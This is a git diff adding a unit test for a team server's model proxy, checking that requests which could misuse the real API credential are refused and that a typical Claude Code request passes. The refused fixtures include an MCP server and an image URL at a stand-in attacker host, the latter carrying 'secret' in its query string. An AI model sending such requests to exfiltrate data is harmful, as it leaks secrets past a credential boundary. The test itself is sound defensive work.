@@ -1,7 +1,7 @@
 import { afterAll, describe, expect, test } from 'bun:test'
 import { makeEnv } from '../lib/env'
 import { waitFor } from '../lib/wait'
-import { issueProxyToken, revokeProxyTokens, startModelProxy } from '../../server/src/proxy/model-proxy'
+import { checkProxyRequest, issueProxyToken, revokeProxyTokens, startModelProxy } from '../../server/src/proxy/model-proxy'
 
 const env = makeEnv('unit-proxy')
 const seen: { headers: Record<string, string>; body: string }[] = []
@@ -75,5 +75,47 @@ describe('model proxy', () => {
     env.db.query("INSERT INTO turns (id, chat_id, user_id, engine) VALUES ('tp2', 'c', 'alice', 'x')").run()
     expect((await call(p.url, { 'x-api-key': issueProxyToken(env.db, 'tp2', 'alice') })).status).toBe(403)
     p.stop()
+  })
+  test('forwarding rules: only what Claude Code needs reaches the upstream with the real credential (design tab 7)', async () => {
+    const tok2 = issueProxyToken(env.db, turnId, 'alice')
+    const n = seen.length
+    const base = { model: 'claude-opus-5-5', max_tokens: 5, messages: [{ role: 'user', content: 'hi' }] }
+    const refused: [string, unknown][] = [
+      ['mcp connector', { ...base, mcp_servers: [{ type: 'url', url: 'https://attacker.example/mcp', name: 'x' }] }],
+      ['code execution', { ...base, container: 'c1' }],
+      ['web_fetch server tool', { ...base, tools: [{ type: 'web_fetch_20250910', name: 'web_fetch' }] }],
+      ['code execution tool', { ...base, tools: [{ type: 'code_execution_20250825', name: 'code_execution' }] }],
+      ['image from a URL', { ...base, messages: [{ role: 'user', content: [{ type: 'image', source: { type: 'url', url: 'https://attacker.example/?d=secret' } }] }] }],
+      ['document from the files API', { ...base, messages: [{ role: 'user', content: [{ type: 'document', source: { type: 'file', file_id: 'f' } }] }] }],
+      ['URL image inside a tool result', { ...base, messages: [{ role: 'user', content: [{ type: 'tool_result', tool_use_id: 't', content: [{ type: 'image', source: { type: 'url', url: 'https://a.example/x' } }] }] }] }],
+      ['unknown block type', { ...base, messages: [{ role: 'user', content: [{ type: 'mcp_tool_use', id: 'x', name: 'n', server_name: 's', input: {} }] }] }],
+      ['not a Claude model', { ...base, model: 'gpt-5' }],
+    ]
+    for (const [label, body] of refused) {
+      const r = await call(key.url, { 'x-api-key': tok2 }, body)
+      expect(r.status, label).toBe(403)
+      expect((await r.json()).error.message, label).toContain('refused by the team server')
+    }
+    for (const p of ['/v1/files', '/v1/messages/batches', '/v1/models']) {
+      const r = await fetch(key.url + p, { method: p === '/v1/models' ? 'GET' : 'POST', headers: { 'x-api-key': tok2, 'content-type': 'application/json' }, body: p === '/v1/models' ? undefined : '{}' })
+      expect(r.status, p).toBe(403)
+    }
+    expect(seen.length).toBe(n) // nothing reached the upstream
+    const a = env.db.query("SELECT COUNT(*) AS n FROM audit_log WHERE action = 'proxy.refused' AND target = ?").get(turnId) as { n: number }
+    expect(a.n).toBe(refused.length + 3)
+    // what Claude Code 2.1.305 sends (captured through a recording upstream): custom tools, the web_search server tool,
+    // inline images and documents, tool results, thinking, cache_control, ?beta=true
+    const ok = { ...base, system: [{ type: 'text', text: 's', cache_control: { type: 'ephemeral' } }], thinking: { type: 'enabled', budget_tokens: 1024 }, context_management: {}, output_config: {}, metadata: { user_id: 'u' },
+      tools: [{ name: 'mcp__team__read', description: 'd', input_schema: { type: 'object' } }, { type: 'web_search_20250305', name: 'web_search', max_uses: 5 }],
+      messages: [
+        { role: 'user', content: [{ type: 'text', text: 'q' }, { type: 'image', source: { type: 'base64', media_type: 'image/png', data: 'AA==' } }, { type: 'document', source: { type: 'base64', media_type: 'application/pdf', data: 'AA==' } }] },
+        { role: 'assistant', content: [{ type: 'thinking', thinking: 't', signature: 's' }, { type: 'tool_use', id: 'tu', name: 'mcp__team__read', input: { file_path: 'x' } }, { type: 'server_tool_use', id: 'st', name: 'web_search', input: { query: 'q' } }, { type: 'web_search_tool_result', tool_use_id: 'st', content: [{ type: 'web_search_result', url: 'https://x.example', title: 't', encrypted_content: 'e' }] }] },
+        { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu', content: [{ type: 'text', text: 'file' }] }] },
+      ] }
+    expect(checkProxyRequest('POST', new URL('http://p/v1/messages?beta=true'), ok)).toBeNull()
+    expect(checkProxyRequest('POST', new URL('http://p/v1/messages/count_tokens?beta=true'), ok)).toBeNull()
+    const r = await fetch(key.url + '/v1/messages?beta=true', { method: 'POST', headers: { 'x-api-key': tok2, 'content-type': 'application/json', 'anthropic-version': '2023-06-01' }, body: JSON.stringify(ok) })
+    expect(r.status).toBe(200)
+    expect(seen.length).toBe(n + 1)
   })
 })
